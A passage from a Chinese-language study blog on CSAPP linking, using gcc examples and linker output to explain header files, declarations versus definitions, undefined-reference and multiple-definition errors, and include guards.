<p>或者在开启了NX保护(堆栈不可执行)之后在堆栈上写<code>shellcode</code>并<code>ret2shellcode</code></p>
<p>都会引起段错误</p>
<h2 id="库文件.a-.so">库文件<code>.a &amp; .so</code></h2>
<p>CSAPP中将静态库放在静态链接讲完之后,动态链接开始讲之前.</p>
<p>但实际上讲动态链接时并没有涉及到静态库.</p>
<p>现在改变一下思路把静态库和动态库这两种库文件放在一起阐述</p>
<h3 id="源头之争">源头之"争"</h3>
<blockquote>
<p><strong>去年的历史遗留问题</strong></p>
<p><strong>1.</strong>在大一学习c语言时我们就知道,如果要使用<code>printf</code>和<code>scanf</code>函数,必须<code>#include &lt;stdio.h&gt;</code>,</p>
<p>如果使用<code>srand(time(0))</code>,其中的<code>time(0)</code>要求<code>#include &lt;time.h&gt;</code></p>
<p>然而实际上去观察一下<code>&lt;stdio.h&gt;</code>这种.h头文件,其中并没有函数的实现,只有函数的接口.那<code>#include &lt;xxx.h&gt;</code>的目的是啥呢?</p>
<p><strong>2.</strong>在大二上学习C++时,函数,类的定义和声明分别写在源还是头文件中,给我们带来了巨大麻烦</p>
<p>头文件既然妹有写实现,源文件中声明和实现相当于都有,那么头文件还有存在的意义吗?难道是只写接口看起来干净整洁好看吗?</p>
<p>非也</p>
</blockquote>
<p><strong>头文件提供一个引用</strong></p>
<p>啥意思呢?下面以一个例子说明,在这个例子中虽然不涉及头文件,但是实际上包括了头文件要做的事</p>
<blockquote>
<p>注意一些文字游戏</p>
<p>"定义"和"实现"是一个说法,都是带函数体的函数,比如<code>int func()&#123;/*花括号里是函数体*/&#125;</code></p>
<p>"声明"和"接口"是一个说法,都是不带函数体,只有一个函数声明,比如<code>int func();//分号结尾,妹有函数体</code></p>
</blockquote>
<p>考虑这么一个程序<code>main.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a=func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>main.c</code>中,<code>func</code>函数既没有定义也没有实现,直接在<code>main</code>函数中调用</p>
<p>现在我们把编译和链接分别执行</p>
<h4 id="编译阶段">编译阶段</h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/linkage]</span><br><span class="line">└─# gcc main.c -c -o main</span><br><span class="line">main.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">main.c:3:11: warning: implicit declaration of <span class="keyword">function</span> ‘func’ [-Wimplicit-function-declaration]</span><br><span class="line">    3 |     int a=func();</span><br><span class="line">      |           ^~~~</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里报了一个警告,意思是<code>func</code>没有直接言明</p>
<blockquote>
<p>编译器很懵逼,func是个啥啊,你妹有定义实现也就罢了,竟然连声明都不打招呼,</p>
<p>上来就用,玩意func有参数,万一func根本就不是函数,是个变量咋整?func有没有返回值啊&gt;_&lt;,返回啥类型值啊?</p>
<p>我编译器只能联系上下文,按照func是一个返回int的无参函数来编译了</p>
<p>链接器你就自求多福吧,我摆烂了</p>
</blockquote>
<blockquote>
<p>那么怎么才能让编译器知道关于func的信息呢?在使用之前声明一下这个函数接口</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a=func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时<strong>编译</strong>就妹有警告了,这意味着编译器此时已经非常自信地认为自己的工作很perfect</p>
</blockquote>
<h4 id="链接阶段">链接阶段</h4>
<p>链接的作用是给每个引用都找到实现,让所有悬而未决的议案落地</p>
<p>在同文件夹下有一个<code>func.c</code>,其中有<code>func()</code>函数的实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">510</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>此时<code>main.c</code>这样写</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a=func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><code>main.c</code>和<code>func.c</code>都已经正确经过编译,生成了可重定位目标文件<code>main.o</code>和<code>func.o</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/linkage]</span><br><span class="line">└─# gcc func.c -c -o func.o</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/linkage]</span><br><span class="line">└─# gcc main.c -c -o main.o</span><br></pre></td></tr></table></figure>
<p>根据前面章节的学习,<code>main.o</code>中有一个func函数的引用悬而未决,如果要形成<code>main.out</code>,需要让这个引用落地</p>
<p>如果直接写<code>gcc main.o -o main</code>不用想都知道会报错</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/linkage]</span><br><span class="line">└─# gcc main.o -o main</span><br><span class="line">/usr/bin/ld: main.o: <span class="keyword">in</span> <span class="keyword">function</span> `main<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">main.c:(.text+0xe): undefined reference to `func&#x27;</span></span><br><span class="line">collect2: error: ld returned 1 <span class="built_in">exit</span> status</span><br></pre></td></tr></table></figure>
<p>链接器报错:func引用未定义</p>
<blockquote>
<p>考虑如下场景</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220525165401741.png"
alt="image-20220525165401741" />
<figcaption aria-hidden="true">image-20220525165401741</figcaption>
</figure>
<p>这里printf未定义的报错是不是和刚才func妹有定义的报错是同一种错误?</p>
</blockquote>
<p>给gcc怎样传递命令行参数,才能不让链接器报错呢?</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/linkage]</span><br><span class="line">└─# gcc main.o func.o -o main</span><br></pre></td></tr></table></figure>
<p>这句话的意思是,将<code>main.o</code>和<code>func.o</code>进行链接,(如果妹有链接错误的话)形成可执行目标文件<code>main</code></p>
<h4 id="整个过程">整个过程</h4>
<p>现在考虑编译到链接整个过程,怎样才能不报错不报警告?</p>
<p>1.编译时引用要提前声明一下</p>
<p>2.链接时要包含所有引用实现的模块</p>
<h4 id="回到源头之争">回到源头之"争"</h4>
<p><code>#include &lt;stdio.h&gt;</code>是一条宏定义,在预编译阶段会被展开,也就是将<code>stdio.h</code>中的所有东西都加在<code>main.c</code>的一开始,形成<code>main.i</code></p>
<p><code>main.i</code>实际上还是<code>ASCII</code>文本文档,和<code>main.c</code>几乎妹有区别</p>
<p>还记得<code>&lt;stdio.h&gt;</code>中都是写的啥吗?函数声明</p>
<p>那么<code>main.i</code>是个啥?</p>
<p>一伙子函数引用+我们自己写的<code>main</code>函数,</p>
<p>which调用了<code>printf</code>,</p>
<p>which在前面一伙子函数引用中有一席之地.</p>
<p>可见<code>&lt;stdio.h&gt;</code>帮我们完成了声明函数引用的工作.</p>
<blockquote>
<p>为什么要用一个头文件来做这个工作?我们程序员是傻吗?自己声明一个printf的引用不行吗?</p>
<p>其一,printf是个变参函数,这一下子就限制了很多人写函数引用,变参函数的函数接口长啥样啊?我也不知道</p>
<p>其二,printf的返回值是啥,<code>int?long?unsigned?size_t?</code>调用约定是啥?<code>__cdecl?__fastcall?</code>即使我记性好,这些都记住了,那么<code>scanf,sprintf,fgetc,fwrite....</code>等等函数的接口又长啥样?难道每次调用一个库函数都要去查手册吗?手册得多厚啊,新华字典见了都怕</p>
</blockquote>
<p>在预编译阶段过后,宏定义被展开,此时头文件就完成了自己的使命</p>
<p>奇怪的是,即使我们用到了<code>glibc</code>库中的函数<code>printf</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Helloworld&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是在编译链接时,也没有指定<code>printf</code>在哪里实现啊?</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/linkage]</span><br><span class="line">└─# gcc main.c -o main</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/linkage]</span><br><span class="line">└─# ./main</span><br><span class="line">Helloworld</span><br></pre></td></tr></table></figure>
<p>按照我们在"链接阶段"举的例子,这里就应该链接报错<code>"undefined reference : 'printf' "</code></p>
<p>而实际上程序链接地好好的</p>
<p>这是因为,<code>printf</code>
的实现在<code>glibc.so</code>动态库中,而该动态库会被链接器自动且隐式地链接</p>
<p><code>printf</code>实现所在的源文件去哪了?</p>
<p>源文件被编译成<code>glibc.so</code>动态库了,从一个ASCII文档变成二进制文件了,源文件的灵魂已经装进<code>glibc.so</code></p>
<p>如果想要看<code>printf</code>源文件怎么实现的,去哪里找呢?</p>
<p>谷歌或者百度<code>glibc-2.9</code>或者其他版本,去官网下载吧</p>
<h4 id="明确分工">明确分工</h4>
<p>在大二上学面向对象C++的时候,曾经费尽心思记什么东西应该写到头文件里,什么东西应该写到源文件里(到考试,到现在也没记住)</p>
<p>其实学了链接时符号解析规则,这些问题根本就不是问题</p>
<p>刚才已经举例说明了,头文件的作用就是声明一下函数接口,起引用作用</p>
<h5 id="头文件可以写函数实现吗">头文件可以写函数实现吗</h5>
<p>现在基于对链接的了解,考虑<strong>头文件里可以写函数实现吗</strong>?</p>
<blockquote>
<p>貌似可以,并且可以说出歪歪理儿,举一个有模有样的例子:</p>
<p><code>func.h</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">510</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>main.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;func.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a=func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样<code>gcc main.c -o main</code>不会报错,并且连链接时指定可重定位目标文件或者库文件都省去了,岂不美哉?</p>
<p>当然不会报错,这样写<code>func.h</code>改名为<code>func.balabala</code>都可以,<code>.h</code>后缀妹有意义</p>
<p>实际上相当于写了</p>
<p><code>main.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">510</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a=func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>这里不报错的原因是,整个编译链接就涉及到两个模块,并且只有<code>main</code>引用了<code>func</code>,这关系简单明了</p>
<p>可如果这样写呢?</p>
<p><code>func.h</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">510</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>func1.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;func.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">func1</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>*func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>func2.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;func.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">func2</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4</span>*func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序入口这样写:</p>
<p><code>main.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func1</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">func2</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a=func1();		<span class="comment">//要调用func1必然要链接func1.o目标模块</span></span><br><span class="line">    <span class="type">int</span> b=func2();		<span class="comment">//要调用func2必然要链接func2.o目标模块</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220525202607308.png"
alt="image-20220525202607308" />
<figcaption aria-hidden="true">image-20220525202607308</figcaption>
</figure>
<blockquote>
<p>main中相当于有两个func的定义</p>
</blockquote>
<p>使用<code>gcc main.c func1.c func2.c -o prog</code>企图编译链接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/linkage]</span><br><span class="line">└─# gcc main.c func1.c func2.c -o prog</span><br><span class="line">/usr/bin/ld: /tmp/ccb95Wtp.o: <span class="keyword">in</span> <span class="keyword">function</span> `func<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">func2.c:(.text+0x0): multiple definition of `func&#x27;</span>; /tmp/ccAEawPN.o:func1.c:(.text+0x0): first defined here</span><br><span class="line">collect2: error: ld returned 1 <span class="built_in">exit</span> status</span><br></pre></td></tr></table></figure>
<p>发现编译是可以通过的,报错全是链接错,<code>func</code>有多重定义</p>
<p>为啥会报错呢?</p>
<p>第一次预见<code>func</code>的定义是在<code>func1.c</code>中,竟然在<code>func2.c</code>中又预见了<code>func</code>的定义</p>
<p>实际上相当于写了这么一个程序:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span>&#123;					<span class="comment">//func第一处定义</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">510</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">func1</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>*func();</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span>&#123;					<span class="comment">//func第二处定义</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">510</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">func1</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4</span>*func();</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">func1</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">func2</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a=func1();	</span><br><span class="line">    <span class="type">int</span> b=func2();	</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>func</code>被定义了两次,函数名字和参数表一模一样,不是重载也不是重写,必然会报错</p>
<p>用前面章节的知识解释,函数定义是硬符号,符号解析时硬符号最多有一个,如果链接器发现有两个以上的同名硬符号则报错</p>
<blockquote>
<p>有人在往linux内核里添加系统调用的时候就在<code>syscalls.h</code>里面写了内核函数的实现,我不说是谁</p>
</blockquote>
<p>那么为了防止上述多重定义的情况发生,应该怎么办呢?</p>
<p>不允许多重定义,还能不允许多重引用吗?</p>
<p>头文件里只写函数声明或者说函数接口,源文件里写函数实现呗</p>
<h6 id="正确写法">正确写法</h6>
<h6 id="main.c"><code>main.c</code></h6>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;func1.h&quot;</span>		<span class="comment">//main中只引用了func1和func2,妹有引用func,因此不用#include &lt;func.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;func2.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a=func1();</span><br><span class="line">    <span class="type">int</span> b=func2();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="func.h-func.c"><code>func.h &amp; func.c</code></h6>
<p><code>func.h</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FUNC		<span class="comment">//如果妹有定义FUNC符号才拓展该宏,条件展开发生在预编译时期</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FUNC</span></span><br><span class="line">	<span class="type">int</span> <span class="title function_">func</span><span class="params">()</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br></pre></td></tr></table></figure>
<p><code>func.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;func.h&quot;</span>	<span class="comment">//引用func.h的作用是,在预编译阶段把int func()搞进来,</span></span></span><br><span class="line">					<span class="comment">//实际上由于只有一个函数,并且接口简单,不使用头文件都可以.规范期间还是使用头文件</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">510</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="func1.h-func1.c"><code>func1.h &amp; func1.c</code></h6>
<p><code>func1.h</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FUNC1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FUNC1</span></span><br><span class="line">	<span class="type">int</span> <span class="title function_">func1</span><span class="params">()</span>;		<span class="comment">//虽然func1中会引用func,但头文件中不写include &lt;func.h&gt;,因为头文件就只是提供该模块中函数的引用,</span></span><br><span class="line">						<span class="comment">//具体函数实现中引用了什么其他家的花草,头文件并不关心</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br></pre></td></tr></table></figure>
<p><code>func1.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;func1.h&quot;</span>					<span class="comment">//这里两个头的include先后顺序无所谓,反正都是引用</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;func.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">func1</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>*func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="func2.h-func2.c"><code>func2.h &amp; func2.c</code></h6>
<p><code>func2.h</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FUNC2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FUNC2</span></span><br><span class="line">	<span class="type">int</span> <span class="title function_">func2</span><span class="params">()</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br></pre></td></tr></table></figure>
<p><code>func2.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;func.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;func2.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">func2</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4</span>*func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="通过链接">通过链接</h6>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/linkage]</span><br><span class="line">└─# gcc func1.c func.c main.c func2.c -o prog				<span class="comment">#这里源文件的先后顺序妹有区别,但是一定要写全需要的源文件</span></span><br><span class="line">															<span class="comment">#编译链接成功</span></span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/linkage]</span><br><span class="line">└─# ./prog													<span class="comment">#运行</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="头文件可以写全局变量吗">头文件可以写全局变量吗</h5>
<p>还是以<code>geometry</code>的例子(见下文静态库-&gt;使用静态库),假如在<code>geometry.h</code>中,我们定义了一个全局变量<code>PI</code></p>
<p><code>geometry.h</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> GEOMETRY</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GEOMETRY</span></span><br><span class="line"><span class="type">const</span> <span class="type">double</span> PI=<span class="number">3.1415926</span>;</span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>我们的目的是,只要引用了该头文件就可以直接使用PI,比如</p>
<p>在<code>main.c</code>中:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;geometry.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="type">int</span> pi=PI;	<span class="comment">//试图阔的PI的拷贝</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果却报告链接错误了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/Desktop/linkage]</span><br><span class="line">└─$ ./makedynamiclib.sh</span><br><span class="line">/usr/bin/ld: /tmp/cc9eI8oy.o:(.rodata+0x0): multiple definition of `PI<span class="string">&#x27;; /tmp/cci0ubCp.o:(.rodata+0x0): first defined here</span></span><br><span class="line"><span class="string">collect2: error: ld returned 1 exit status</span></span><br><span class="line"><span class="string">/usr/bin/ld: cannot find ./libgeometry.so: No such file or directory</span></span><br><span class="line"><span class="string">collect2: error: ld returned 1 exit status</span></span><br><span class="line"><span class="string">./makedynamiclib.sh: line 5: ./prog: No such file or directory</span></span><br></pre></td></tr></table></figure>
<p>意思是<code>PI</code>有多重定义了</p>
<p>为啥会报链接错:有多重定义?</p>
<p><code>line.c</code>和<code>point.c</code>,<code>main.c</code>中都有<code>#include "geometry.h"</code></p>
<p>前面我们也分析了头文件的作用,头文件中的东西在预编译宏展开之后会直接加到源文件前面.</p>
<p>那么预编译之后,<code>line.i,point.i,main.i</code>中各有一次<code>const double PI=3.1415926</code>的定义,这是硬符号,然后三个文件都被编译成可重定位目标文件.o准备链接</p>
<p>链接时同名的全局符号只允许有至多一个硬符号,而对于<code>PI</code>符号,链接器可以发现两个(找到第二个就报错了,不管第三个了)因此报链接错,多重定义</p>
<blockquote>
<p>可是我们头文件中宏定义是条件展开的啊,已经定义过就不会被定义了啊?</p>
<p>考虑宏定义的展开是在预编译阶段,远没到链接,等到链接的时候,早就都展开了
.条件展开的作用是防止同一个头文件被多次include</p>
<blockquote>
<p>比如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br></pre></td></tr></table></figure>
